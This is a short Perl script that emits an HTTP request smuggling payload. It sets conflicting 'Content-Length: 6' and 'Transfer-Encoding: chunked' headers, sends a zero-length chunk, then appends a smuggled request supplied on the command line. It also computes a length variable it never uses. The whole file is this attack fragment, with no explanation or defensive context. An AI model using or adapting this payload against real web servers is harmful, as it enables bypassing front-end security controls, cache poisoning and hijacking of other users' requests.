#!/usr/bin/perl
#
#sasas
my $payload = shift @ARGV;
my $content_length = 5 + length($payload);
print "Content-Length: 6
Transfer-Encoding: chunked

0

$payload"
